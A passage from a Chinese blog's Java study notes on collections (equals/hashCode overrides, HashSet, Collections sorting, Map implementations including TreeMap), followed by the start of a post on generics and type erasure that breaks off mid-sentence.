<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">int</span> <span class="title">hash</span><span class="params">(Object... values)</span></span>;</span><br></pre></td></tr></table></figure>
<p>简单的重写代码：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Tempest</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> age;</span><br><span class="line">    String name;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">hashCode</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> Objects.hash(age,name);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="重写-equals"><a href="#重写-equals" class="headerlink" title="重写 equals()"></a>重写 equals()</h4><p>编写 equals() 当然也有一些原则，不过我认为这些原则都没啥用，只要能合理的重写 equals 方法即可。我们比较 两个实例是否相等的方式就是依次比较它的字段值，如果每个字段值都相等，那么就认为这两个实例是相等的，字段值有两种，一种是基本类型，一种是引用类型。对于基本类型，我们可以直接用 <code>==</code> 进行判断，但是引用类型就不可以了。</p>
<p>引用类型使用 <code>==</code> 判断比较的是引用地址是否相同，假使两个实例的所有字段都相同，但是由两个 new 语句建立的，那么引用地址就肯定不相同，导致使用 <code>==</code> 判断也不相同。所以对于引用类型的字段来说，我们使用它自带的 equals() 进行比对，但是，如果比对 equals() 的一方的引用类型字段为 null，那么调用它的 equals() 就会抛出异常，所以我们还需要单独判断是否为 null，这就太麻烦了。</p>
<p>麻烦的东西自然有人帮助我们处理，直接使用 Objects 类种的静态方法 equals() 传入两个引用类型，它会自动返回是否相等。因此我们就可以得到重写 equals() 的步骤了。</p>
<ol>
<li>首先判断传入的  <code>Object</code> 是不是此类的实例，如果是则开始下一步。</li>
<li>然后将传入的 <code>Object</code> 向下转型为当前类的实例，方便比较字段。</li>
<li>然后比较字段，引用类型使用 <code>Objects.equals(Object a,Object b)</code>，基本类型直接使用 <code>==</code> 。</li>
</ol>
<p>简单的重写代码：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Tempest</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> age;</span><br><span class="line">    String name;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">equals</span><span class="params">(Object o)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(o <span class="keyword">instanceof</span> Tempest) &#123;</span><br><span class="line">            Tempest P=(Tempest)o;</span><br><span class="line">            <span class="keyword">return</span> Objects.equals(<span class="keyword">this</span>.name,P.name)&amp;&amp;<span class="keyword">this</span>.age==P.age;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="使用-HashSet-集合"><a href="#使用-HashSet-集合" class="headerlink" title="使用 HashSet 集合"></a>使用 HashSet 集合</h4><p>这里就可以看出来 Set 和 List 的使用区别了，如果需要存储重复的元素，那么只能使用 List ，如果没必要存储重复元素，则使用 Set 。 Set 虽然有着无序和无法通过下标访问的缺点，但是因为使用了映射机制，实现了 List 的无法全部获得的优点：同时实现插入和查询的高效。</p>
<p>因此如果没有必须要重复存储一些元素，那我们直接使用 Set 类。</p>
<h3 id="LinkedHashSet-集合"><a href="#LinkedHashSet-集合" class="headerlink" title="LinkedHashSet 集合"></a>LinkedHashSet 集合</h3><p>LinkedHashSet 集合和 HashSet 集合之间的区别仅仅就是在前者比后者内部多了一个链表用来记录存储元素的先后顺序，这个链表仅仅只在迭代器工作的时候使用，它可以保证迭代的顺序和插入元素的顺序是相同的。而 HashSet 因为只有一个哈希表，所以迭代顺序可能会随着插入了元素而变化。</p>
<h2 id="Collections-集合工具"><a href="#Collections-集合工具" class="headerlink" title="Collections 集合工具"></a>Collections 集合工具</h2><p>集合工具，故名思意，就是用于操作集合的工具，这个类里面拥有很多直接操作集合的方法，帮助我们更好使用集合。</p>
<h3 id="1-排序"><a href="#1-排序" class="headerlink" title="1. 排序"></a>1. 排序</h3><p>对一个集合进行排序的时候，如果集合里面拥有排序方法，那么就可以调用集合里面的排序方法对集合进行排序。如果没有的话，则可以利用 Collections 类的静态方法 sort() 对集合进行排序操作，需要注意的是，这里的排序只能用于列表 List ，而不能用于 Set 。</p>
<p>实现排序最根本的要求就是知道如何比较集合里面两个元素的大小，对于 Collections 类里面有两种排序方法，一种是 <code>sort(List&lt;T&gt; list)</code> ，直接传入一个列表既可，但需要列表的元素类实现 <code>interface Comparable&lt;T&gt;</code> 接口并重写 <code>compareTo()</code> 方法。另外一种则是使用 <code>sort(List&lt;T&gt; list, Comparator&lt;? super T&gt; c)</code> 里面传入列表和对应元素类型需要的比较器 Comparator 。</p>
<ul>
<li>首先我们介绍第一种，在类中实现 <code>interface Comparable&lt;T&gt;</code> 接口，并重写里面的 <code>compareTo()</code> 方法。<code>public int compareTo(T o);</code>  ，如果返回<strong>零</strong>则表示两者相等，返回<strong>正数</strong>表示自己大于比较对象 o ，返回<strong>负数</strong>表示自己小于比较对象。</li>
<li>第二种的优势在于可以定义临时的比较方法，不在类中将比较方法写死了，使用匿名类传入参数 <code>Comparator&lt;? super T&gt; c</code>  ，只需要重写 <code>public int compare(T o1, T o2);</code> 方法即可。下面展示一下：</li>
</ul>
<p>这里代码的主要思路就是对一个元素类型是 Tempest 类的列表进行排序，而我们的类 Tempest 考虑到不同的用途有不同的比较方法，就没有实现 <code>compareTo()</code> ，因此这里使用 Collections 里面的 <code>sort(List&lt;T&gt; list, Comparator&lt;? super T&gt; c)</code> ，其中第二个参数就是我们临时生成的匿名类，里面实现了 compare 方法。这个比较规则是首先按照年龄排序，如果年龄相同，则按照姓名排序。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> Java;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"><span class="keyword">import</span> java.util.Collections;</span><br><span class="line"><span class="keyword">import</span> java.util.Comparator;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        ArrayList&lt;Tempest&gt; list=<span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">        list.add(<span class="keyword">new</span> Tempest(<span class="string">&quot;Xorex&quot;</span>,<span class="number">19</span>));</span><br><span class="line">        list.add(<span class="keyword">new</span> Tempest(<span class="string">&quot;Asuna&quot;</span>,<span class="number">20</span>));</span><br><span class="line">        list.add(<span class="keyword">new</span> Tempest(<span class="string">&quot;Yukino&quot;</span>,<span class="number">18</span>));</span><br><span class="line">        list.add(<span class="keyword">new</span> Tempest(<span class="string">&quot;Megumi&quot;</span>,<span class="number">18</span>));</span><br><span class="line">        list.add(<span class="keyword">new</span> Tempest(<span class="string">&quot;Origami&quot;</span>,<span class="number">17</span>));</span><br><span class="line">        Collections.sort(list,<span class="keyword">new</span> Comparator&lt;Tempest&gt;() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">compare</span><span class="params">(Tempest o1,Tempest o2)</span> </span>&#123;</span><br><span class="line">                <span class="keyword">if</span>(o1.getAge()==o2.getAge()) &#123;</span><br><span class="line">                    <span class="keyword">return</span> o1.getName().compareTo(o2.getName());</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">return</span> o1.getAge()-o2.getAge();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">        System.out.println(list);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Tempest</span> </span>&#123;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> age;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    </span><br><span class="line">    Tempest(String name,<span class="keyword">int</span> age) &#123;</span><br><span class="line">        <span class="keyword">this</span>.name=name;</span><br><span class="line">        <span class="keyword">this</span>.age=age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getAge</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> name+<span class="string">&#x27;:&#x27;</span>+age;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="洗牌-shuffle"><a href="#洗牌-shuffle" class="headerlink" title="洗牌 shuffle"></a>洗牌 shuffle</h3><p>洗牌故名思意，就是将列表里面的元素顺序打乱，这种打乱是随机的，每次都不同的打乱。这种方法则是使用 Collections 中的静态方法：<code>Collections.shuffle(List&lt;?&gt; list)</code> 。</p>
<h3 id="不可变集合"><a href="#不可变集合" class="headerlink" title="不可变集合"></a>不可变集合</h3><p>再 Collections 中，可以封装三种类型非不可变集合：</p>
<ul>
<li>封装成不可变 List：<code>List&lt;T&gt; unmodifiableList(List&lt;? extends T&gt; list)</code></li>
<li>封装成不可变 Set：<code>Set&lt;T&gt; unmodifiableSet(Set&lt;? extends T&gt; set)</code></li>
<li>封装成不可变 Map：<code>Map&lt;K, V&gt; unmodifiableMap(Map&lt;? extends K, ? extends V&gt; m)</code></li>
</ul>
<p>调用这些方法，传入集合，然后返回一个不可变集合。需要注意的是，原来的集合实例还是可以修改的，而且修改之后，也同样会会修改返回的不可变实例。因此我们如果想要把一个集合变成不可变的，那么应该直接扔掉可变实例的引用，只留下来返回的不可变实例。</p>
<h2 id="Map-容器"><a href="#Map-容器" class="headerlink" title="Map 容器"></a>Map 容器</h2><h3 id="基本-Map-的概念"><a href="#基本-Map-的概念" class="headerlink" title="基本 Map 的概念"></a>基本 Map 的概念</h3><p>需要注意的是，这里的 Map 并不是地图的意思，而是<strong>映射</strong>。我们看看 Map 的定义：</p>
 <figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">Map</span>&lt;<span class="title">K</span>, <span class="title">V</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>这里接口 Map 并没有继承与 Collection 或者 Iterator，而是作为默认继承了 Object，说明它并不是 “集合” 的一个下属，而是和 Collection 同级别的存在。我们一般的集合指的都是 Collection 实现的子类，而 Map，我认为被叫做容器更为合适一点，但是大家都叫做它集合。</p>
<p>Map 映射，从它的定义就能看出来，拥有两个泛型 <code>&lt;K, V&gt;</code> 表示 key 和 value 的一个键值对的映射。这种映射是拥有一定要求的，最重要的一点就是 Key 是不允许重复的，我们通过键访问值，键因此不能重复。</p>
<p>Map 集合里面拥有一些方法可以使用：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">size</span><span class="params">()</span></span>; <span class="comment">//返回Map中拥有的映射数量</span></span><br><span class="line"><span class="function"><span class="keyword">boolean</span> <span class="title">isEmpty</span><span class="params">()</span></span>; <span class="comment">//返回Map是否为空</span></span><br><span class="line"><span class="function"><span class="keyword">boolean</span> <span class="title">containsKey</span><span class="params">(Object key)</span></span>; <span class="comment">//返回是否存在键key</span></span><br><span class="line"><span class="function"><span class="keyword">boolean</span> <span class="title">containsValue</span><span class="params">(Object value)</span></span>; <span class="comment">//返回是否存在值value</span></span><br><span class="line"><span class="function">V <span class="title">get</span><span class="params">(Object key)</span></span>; <span class="comment">//输入key返回value</span></span><br><span class="line"><span class="function">V <span class="title">put</span><span class="params">(K key, V value)</span></span>; <span class="comment">//输入一个键值对，建立一个null,如果key不存在返回null,存在返回原来value</span></span><br><span class="line"><span class="function">V <span class="title">remove</span><span class="params">(Object key)</span></span>; <span class="comment">//输入键，移除此键值对映射</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">putAll</span><span class="params">(Map&lt;? extends K, ? extends V&gt; m)</span></span>; <span class="comment">//将一个现成Map存入当前Map</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">clear</span><span class="params">()</span></span>; <span class="comment">//清空Map</span></span><br><span class="line"><span class="function">Set&lt;K&gt; <span class="title">keySet</span><span class="params">()</span></span>; <span class="comment">//返回一个Set集合，里面为Map的键</span></span><br><span class="line"><span class="function">Collection&lt;V&gt; <span class="title">values</span><span class="params">()</span></span>; <span class="comment">//返回一个集合，里面为Map的值</span></span><br><span class="line">Set&lt;Map.Entry&lt;K, V&gt;&gt; entrySet(); <span class="comment">//返回一个Set集合，里面元素为Map.Entry&lt;K,V&gt;实例，每个实例保存了一个键值对映射。</span></span><br></pre></td></tr></table></figure>
<p>上面的方法中，需要注意的是 <code>V put(K key, V value);</code> ，因为 key 的唯一性，当我们使用 put 方法传入一个 key 已经存在 Map 里面的 key-value2 映射的时候，这个 key 映射的 value1 会被新的 value2 覆盖，并且 put 方法会把这个 value1 给返回回来。如果 key 不存在与 Map 的时候，新添加一个 key-value 只会返回 null。</p>
<h3 id="迭代-Map"><a href="#迭代-Map" class="headerlink" title="迭代 Map"></a>迭代 Map</h3><p>因为 Map 没有继承 Iterator 接口，所以自然不存在 iterator() 来返回迭代器，所以如果想要迭代 Map 的话，有两种方法可以实现：</p>
<ul>
<li>第一种是使用 <code>Set&lt;K&gt; keySet();</code> 方法，获取一个 装满 key 的 Set 集合，用 Set 的迭代器迭代出来 Map 所有的 key ，再通过 key 和 <code>V get(Object key);</code> 方法获取 value。</li>
<li>第二种是使用 <code>Set&lt;Map.Entry&lt;K, V&gt;&gt; entrySet();</code> 返回一个装满 <code>Map.Entry&lt;K,V&gt;</code> 实例的 Set 集合，然后迭代这个集合，对于集合中的每个 <code>Map.Entry&lt;K,V&gt;</code> 实例，使用它的 <code>K getKey();</code> 和 <code>V getValue();</code> 来获取键值对信息即可。</li>
</ul>
<h3 id="Map-接口实现-HashMap"><a href="#Map-接口实现-HashMap" class="headerlink" title="Map 接口实现 HashMap"></a>Map 接口实现 HashMap</h3><p>HashMap 是使用哈希算法来实现 Map 接口的一种集合，这里 HashMap 和 HashSet 使用的技术是一模一样的，都为哈希，不同之处就是 Map 为存储键值对的映射容器，而 Set 为存储单一元素的集合，Map 对于单个元素的访问可以通过键或者值，而 Set 对于单个元素的访问只能通过值。</p>
<p>我们使用 Map 的时候都是通过 HashMap 来实现的，不过因为采用了 Hash 技术，和前面的 HashSet 一样，想要存储自定义数据类型，必须实现 key 类自己的 equals() 和 hashCode() ，两者的实现方法在上面已经写过了。而 value 无需实现两者，因为其实现是针对 key 进行计算位置的以及是否哈希冲突的。</p>
<h3 id="LinkedHashMap"><a href="#LinkedHashMap" class="headerlink" title="LinkedHashMap"></a>LinkedHashMap</h3><p>首先观察此类的定义，发现它是继承于 HashMap 的：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">LinkedHashMap</span>&lt;<span class="title">K</span>,<span class="title">V</span>&gt; <span class="keyword">extends</span> <span class="title">HashMap</span>&lt;<span class="title">K</span>,<span class="title">V</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>这意味着这个类拥有 HashMap 所有的方法，他们之间的不同之处就是 LinkedHashMap 自己内部通过链表实现了一个加入顺序的记录，也就是说，我们如果直接输出 LinkedHashMap 的实例，发现里面的元素顺序和我们添加的顺序是相同的，这就是 Linked 的意义所在。而且这个输出顺序同样体现在： <code>Set&lt;K&gt; keySet();</code> 方法和<code>Set&lt;Map.Entry&lt;K, V&gt;&gt; entrySet();</code> 方法返回的 Set 集合里元素的顺序，同样是按照输入的顺序保留下来的。（其实返回来的本质上是 LinkedHashSet 来保证顺序的）</p>
<h3 id="TreeMap"><a href="#TreeMap" class="headerlink" title="TreeMap"></a>TreeMap</h3><p>我们来看看 TreeMap 在 Map 家族里面的关系：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">       ┌───┐</span><br><span class="line">       │Map│</span><br><span class="line">       └───┘</span><br><span class="line">         ▲</span><br><span class="line">    ┌────┴─────┐</span><br><span class="line">    │          │</span><br><span class="line">┌───────┐ ┌─────────┐</span><br><span class="line">│HashMap│ │SortedMap│</span><br><span class="line">└───────┘ └─────────┘</span><br><span class="line">               ▲</span><br><span class="line">               │</span><br><span class="line">          ┌─────────┐</span><br><span class="line">          │ TreeMap │</span><br><span class="line">          └─────────┘</span><br></pre></td></tr></table></figure>
<p>这里 TreeMap 是实现了 SortedMap 接口里面的内容，表示它通过了树结构，实现了可排序的 Map。因为本身 HashMap 这样的类一是不像 ArrayList 一样内置了 sort() 方法，二是不像 Collection 大家族拥有 Collections 类来对其进行排序操作。因此 Map 家族就直接搞了一个 TreeMap 来实现 Map 的排序。</p>
<p>TreeMap 内部实现是利用红黑树实现查询和排序的，因此相对于 HashMap，他获得了 Key 排好顺序的同时，失去了 O(1) 复杂度的查询，变成了O(Logn) 。因此，如果没有必须的排序要求，还是建议使用 HashMap。因为实现方法不是哈希算法，所以自然不需要对 key 类进行实现 hashCode() 和 equals() 。</p>
<p>使用 TreeMap 的时候，因为要排序，所以需要 key 类实现接口 comparable 的 compareTo()，或者在建立 TreeMap 实例的时候，直接给构造方法传入一个比较器 Comparator ，这里原理都和 Collections 排序集合一样。</p>
<hr>
<p>集合的内容好多啊，所以就又拆分出来了一篇文章，第二篇的内容就比较少了，而且体系化相对来说比较弱一点，都是一些零零散散的工具集合，加油吧少年！</p>
]]></content>
      <categories>
        <category>开发知识</category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>笔记</tag>
        <tag>集合</tag>
      </tags>
  </entry>
  <entry>
    <title>Java泛型学习笔记</title>
    <url>/2021/01/10/6303f95aef53/</url>
    <content><![CDATA[<h2 id="何为泛型"><a href="#何为泛型" class="headerlink" title="何为泛型"></a>何为泛型</h2><h3 id="泛型概念"><a href="#泛型概念" class="headerlink" title="泛型概念"></a>泛型概念</h3><p>泛型故名思意，就是广泛的类型，其本质就是参数化类型。在各种资料里面，泛型的概念都是通过 ArrayList 这个类来引入的，那么这里也用它来引入泛型的概念。</p>
<p>ArrayList 我没有使用过，但是它是一个变长数组，可以通过方法 <code>.add()</code> 来不断增加元素，而不用担心空间大小不够的问题。这个类可以实现任意类型的可变数组，而实现的方法就是通过泛型来实现：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ArrayList</span>&lt;<span class="title">E</span>&gt; <span class="keyword">extends</span> <span class="title">AbstractList</span>&lt;<span class="title">E</span>&gt; // <span class="title">ArrayList</span> 类的声明</span></span><br><span class="line"><span class="class"><span class="title">public</span> <span class="title">void</span> <span class="title">add</span>(<span class="title">int</span> <span class="title">index</span>, <span class="title">E</span> <span class="title">element</span>) // <span class="title">add</span>方法的一个重载</span></span><br></pre></td></tr></table></figure>
<p>首先可能就注意到了，这个类名是 <code>ArrayList&lt;E&gt;</code> 并且在 add 方法的参数里面，element 的类型是 E ，这个 E 就是一个类型的代称，取什么名字都行，这个 E 表示什么类型，完全取决于在实例化 ArrayList 的时候，给它指定的类型。</p>
<p>比如我们想要一个 String 类型的可变数组，那么声明方法就是：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">ArrayList&lt;String&gt; strs=<span class="keyword">new</span> ArrayList&lt;String&gt;;</span><br></pre></td></tr></table></figure>
<p>这样，上面的 <code>&lt;E&gt;</code> 被声明的时候填充成了 <code>&lt;String&gt;</code> 那么这个 E 就变成了 String ，下面的 element 的类型就变成了 String，这个 ArrayList 类，就变成了一个专门实现字符串数组的类。</p>
<h3 id="泛型的优势"><a href="#泛型的优势" class="headerlink" title="泛型的优势"></a>泛型的优势</h3><p>当然，由于向上转型的存在，我们可以用 Object 类来代替实现泛型，由于数据的载体是 Object[] ，所以这样实现还能让一个数组里面存储不同的类，第一个元素可以是 String 类型，第二个可以是 Integer 类型。但是这样就会带来一个问题，针对数据操作的时候，不但要将 Object 向下转型为对应类型，还要防止出现误转型，也就是把 String 转成了 Integer ，会抛出 ClassCastException 。</p>
<p>所以使用泛型来来编写一个数据模板是非常合适的，它可以通过指定类型来实现所有类的可变数组，而不需要为不同的类编写不同的可变数组，大大减少了代码量。</p>
<h3 id="泛型的向上转型"><a href="#泛型的向上转型" class="headerlink" title="泛型的向上转型"></a>泛型的向上转型</h3><p>从 ArrayList 的定义来看，它是实现了一个接口  <code>List&lt;T&gt;</code>  也就是说，他们是一个类继承关系。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ArrayList</span>&lt;<span class="title">T</span>&gt; <span class="keyword">implements</span> <span class="title">List</span>&lt;<span class="title">T</span>&gt; </span></span><br></pre></td></tr></table></figure>
<p>那么我们就可以对它进行向上转型，需要注意的是，这里的向上转型是<strong>对携带了 泛型&lt;T&gt; 标志的类的继承关系</strong>的向上转型。转型过程中，泛型&lt;T&gt; 表示的类型需要一样：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">List&lt;String&gt; a=ArrayList&lt;String&gt;;</span><br></pre></td></tr></table></figure>
<hr>
<p>这是一种转型，还有一种转型是<strong>对泛型的</strong>向上转型，也就是对 &lt;T&gt; 这里面的类 T 的向上转型。</p>
<p>对于这种向上转型，Java 是不支持的，原因和上面泛型的优势是一样的，可能会出现 ClassCastException ，也就是误类转型。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">ArrayList&lt;Number&gt; a=ArrayList&lt;Integer&gt;;</span><br><span class="line">a.add(<span class="number">1</span>); <span class="comment">// 1 Integer 属于 Number</span></span><br><span class="line">a.add(<span class="number">1.0</span>); <span class="comment">//1.0 Float 属于 Number</span></span><br><span class="line">Integer b=a.get(<span class="number">1</span>); <span class="comment">//获取索引一的元素也就是 1.0，会抛出ClassCastException</span></span><br></pre></td></tr></table></figure>
<p>所以编译器为了避免出现这样的情况，就根本不允许你对泛型进行向上转型，也就是不让你玩泛型的多态。</p>
<h2 id="泛型的本质"><a href="#泛型的本质" class="headerlink" title="泛型的本质"></a>泛型的本质</h2><h3 id="实现泛型"><a href="#实现泛型" class="headerlink" title="实现泛型"></a>实现泛型</h3><p>众所周知，JVM 虚拟机是一个很笨的东西，像泛型这样灵活的东西，它不太好实现。</p>
<p>怎么办呢，交给编译器实现吧，而 Java 的编译器实现泛型的方法，就是编译器代替人完成安全的强制转型。</p>
<p>比如：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Tempest</span>&lt;<span class="title">T</span>&gt; </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> T son;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setSon</span><span class="params">(T son)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.son=son;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> T <span class="title">getSon</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> son;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">Tempest&lt;String&gt; Xorex=<span class="keyword">new</span> Tempest&lt;&gt;();</span><br><span class="line">Xorex.setSon(<span class="string">&quot;Xorex&quot;</span>);</span><br><span class="line">String Name=Xorex.getSon();</span><br></pre></td></tr></table></figure>
<p>上面的代码会被编译器自动转化为下面的代码（泛型 &lt;T&gt; 被全部替换为 Object，同时自动帮我们根据输入泛型的类型，将 Object 强制转型为我们输入的类型）：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Tempest</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> Object son;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setSon</span><span class="params">(Object son)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.son=son;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">getSon</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> son;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">Tempest Xorex=<span class="keyword">new</span> Tempest();</span><br><span class="line">Xorex.setSon(<span class="string">&quot;Xorex&quot;</span>);</span><br><span class="line">String Name=(String)Xorex.getSon();</span><br></pre></td></tr></table></figure>
<p>所以，所谓的泛型本质上就是编译器帮我们完成了安全的强制转型，无论是 <code>Tempest&lt;String&gt;</code> 还是 <code>Tempest&lt;Integer&gt;</code> ，都为同一个类（操作的时候编译器会自动帮我们加上强制转型为不同的类型，看起来像是不同的类），<code>Tempest&lt;Object&gt;</code> 最后编译也只会出现一个文件：<code>Tempest.class</code> 。</p>
<p>&lt;T&gt; 本质上就是告诉编译器，操作完之后记得把 Object 强制转型为 T 类型，如果不加 &lt;T&gt; ，那么默认就不执行强制转型，直接返回 Object 类型。比如如果使用 Class 的实例的 newInstance() 获取某个类的实例的话，返回的是 Object 类型，而使用 Class&lt;String&gt; 的实例的 newInstance() 获取某个类的实力的话，返回的则是 String 类型。</p>
<h3 id="泛型的局限性"><a href="#泛型的局限性" class="headerlink" title="泛型的局限性"></a>泛型的局限性</h3><p>因而，由于泛型的实现并不是我们所想象的那样：编译器帮我们写一个对应类型的类出来，而是用 Object 的强制转型来骗我们，因而就有了一些和前者不同的局限性:</p>
<h4 id="1-lt-T-gt-不能是基本类型"><a href="#1-lt-T-gt-不能是基本类型" class="headerlink" title="1. &lt;T&gt; 不能是基本类型"></a>1. &lt;T&gt; 不能是基本类型</h4><p>因为实际上 &lt;T&gt; 可以是各种类始由于 Object 来存储接收并实现的，所以 &lt;T&gt; 就只能是引用类型——类，而对于基本类型 int、float 这些则无法使用泛型。</p>
<h4 id="2-无法获得泛型的-Class-实例"><a href="#2-无法获得泛型的-Class-实例" class="headerlink" title="2. 无法获得泛型的 Class 实例"></a>2. 无法获得泛型的 Class 实例</h4><p>其实前面已经提过了，我们无论是对  <code>Tempest&lt;String&gt;</code> 还是 <code>Tempest&lt;Integer&gt;</code> 对于它们的实例，使用 <code>.getClass()</code> 获得的是本质上都是 <code>Tempest&lt;Object&gt;</code> 的 Class，也就是 <code>Tempest.class</code> 文件中的信息。</p>
<p>同样编译器也只有 <code>Tempest.class</code> 这种操作。</p>
<h4 id="3-无法判断带泛型类实例的类型"><a href="#3-无法判断带泛型类实例的类型" class="headerlink" title="3. 无法判断带泛型类实例的类型"></a>3. 无法判断带泛型类实例的类型</h4><p>也就是说 <code>Tempest&lt;String&gt;</code> 和<code>Tempest&lt;Integer&gt;</code> 两者的实例，是没有办法判断是属于二者的，他们只能判断出来都属于 <code>Tempest&lt;Object&gt;</code> 。</p>
<h4 id="4-无法实例化-T-类型"><a href="#4-无法实例化-T-类型" class="headerlink" title="4. 无法实例化 T 类型"></a>4. 无法实例化 T 类型</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Tempest</span>&lt;<span class="title">T</span>&gt; </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">toInstance</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        T One=<span class="keyword">new</span> T(); <span class="comment">//不可以</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>因为上面的代码会被转化为 <code>Object One=new Object()</code> 然后就没有任何意义。想要实现实例化 T，那么就必须借助传入的 Class 类型的实例。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">toInstance</span><span class="params">(Class&lt;T&gt; Tclass)</span> </span>&#123;</span><br><span class="line">    T One=Tclass.newInstance();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>需要注意的是一定要用 <code>Class&lt;T&gt;</code> 这样在调用 Class 的 newInstance() 的时候，会直接返回 T 类型的实例，否则编译器不会给你自动强制转型为 T 类型，而是返回实际的类型 Object 的实例。</p>
<h3 id="实质带来的可能性问题"><a href="#实质带来的可能性问题" class="headerlink" title="实质带来的可能性问题"></a>实质带来的可能性问题</h3><p>还需要小心一个关于泛型本质的潜在问题，由于泛型的 &lt;T&gt; 骗着我们，实际上这个东西是 Object，就会导致潜在的覆写问题。</p>
<p>对于所有类都会继承的 Object 类，他有一个方法：</p>
